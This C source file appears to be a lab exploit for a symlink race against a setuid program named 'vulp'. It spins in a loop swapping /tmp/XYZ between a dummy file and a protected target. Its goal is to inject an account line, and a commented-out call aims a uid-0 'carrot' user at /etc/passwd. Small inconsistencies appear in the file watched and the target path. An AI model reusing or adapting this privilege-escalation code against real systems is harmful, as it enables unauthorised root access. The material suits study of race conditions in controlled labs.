/* race.c  */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>

#define LINK "/tmp/XYZ"
#define DUMMY "/tmp/ZYX"

extern FILE *stdin;
extern FILE *stdout;

void *vulp_loop_thread(){
	int initial_size, final_size;
	struct stat st;
	char filename[] = "/tmp/test";

	stat( filename, &st );
	initial_size = st.st_size;

	while(1){
		system("./vulp < /tmp/race_shadow"); //And now we wait for it to finish...
		
		stat( filename, &st );
		final_size = st.st_size;
		if ( final_size > initial_size ) {
			printf( "\nChanged %s\n", filename );
			exit(EXIT_SUCCESS);
		}
	}
}

void race ( char *filename, char *carrot_name, char *carrot_string) {

	/* Declare variables */
	struct stat st;
	int inicial_size, final_size, counter = 1;
	FILE *carrot_file = NULL, *null_file = NULL;
	pthread_t vulp_thread;


	/* Add input to file */
	unlink( carrot_name );
	carrot_file = fopen( carrot_name, "w" ),
	fprintf(carrot_file, "%s", carrot_string);
	fclose(carrot_file);

	/* Get I/O descriptors */
	carrot_file = fopen( carrot_name, "r" );
	null_file   = fopen( "/dev/null", "w" );

	/* Get file inicial size */
	stat( filename, &st );
	inicial_size = st.st_size;

	pthread_create(&vulp_thread, NULL, (vulp_loop_thread), NULL);

	while ( 1 ) {

		if( unlink( LINK ) || symlink( DUMMY, LINK )){
			printf("%s", strerror(errno));
			exit(7);
		}

		if( unlink( LINK ) || symlink( filename, LINK ))
			exit(7);
	}

}

int main ( int argc, char** argv ) {

	//race( "/etc/passwd", "/tmp/race_passwd", "carrot:x:0:0:carrot:/root:/bin/bash" );
	race( "/etc/test", "/tmp/race_shadow", "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::" );

	/* End process successfully */
	exit( EXIT_SUCCESS );

}
